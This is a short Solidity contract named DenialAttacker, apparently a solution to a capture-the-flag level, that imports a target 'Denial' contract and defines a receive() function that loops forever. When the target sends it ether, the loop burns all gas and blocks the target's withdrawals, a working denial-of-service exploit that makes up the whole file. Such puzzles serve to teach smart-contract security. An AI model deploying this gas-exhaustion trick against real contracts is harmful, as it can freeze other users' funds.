// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./Denial.sol";

contract DenialAttacker {
    Denial public denial; 

    constructor(Denial _denial) public {
       denial = _denial;
    }

    receive() external payable {
        while(true) {
        }
    }
}
